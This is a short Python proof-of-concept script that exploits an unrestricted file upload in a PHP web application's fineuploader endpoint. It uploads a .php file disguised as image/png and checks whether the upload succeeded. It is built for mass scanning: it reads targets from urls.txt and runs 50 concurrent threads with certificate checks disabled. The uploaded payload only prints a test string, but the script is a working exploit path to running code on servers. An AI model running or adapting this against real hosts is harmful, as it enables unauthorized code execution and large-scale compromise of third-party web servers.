import requests

def poc (url):
    # Target URL
    url = f"{url}index.php?document-api-fineuploader"

    # Multipart form-data content with the PHP file payload
    multipart_form_data = {
        'qqfile': ('c3.php', '<?php var_dump("helloworld");?>', 'image/png')
    }
    proxy = {
    'http':'http://127.0.0.1:7890',
    'https':'http://127.0.0.1:7890',
    }
    # Headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    # Sending the POST request
    try:
        response = requests.post(url,timeout=5,verify=False,files=multipart_form_data,headers=headers)

        # Print the response from the server
        if response.status_code == 200:
            if "success" in response.text:
                if len(response.text.strip()) >50 and len(response.text.strip()) <200  :
                    
                    print("File uploaded successfully.",url)
                    print("正文：",response.text)
        else:
            # print(f"Failed to upload the file. HTTP Status Code:{url} ===={response.status_code}")
            pass
    except Exception as e:
        pass

import warnings
warnings.filterwarnings("ignore")
# with open("urls.txt", "r") as file:
#         urls = list(set(file.readlines()))
# for url in urls:
#     poc(url.strip())
from concurrent.futures import ThreadPoolExecutor
# 批量检测
with open('urls.txt', 'r') as file:
    urls = [u.strip() for u in file.readlines()][200:]
with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(poc, urls)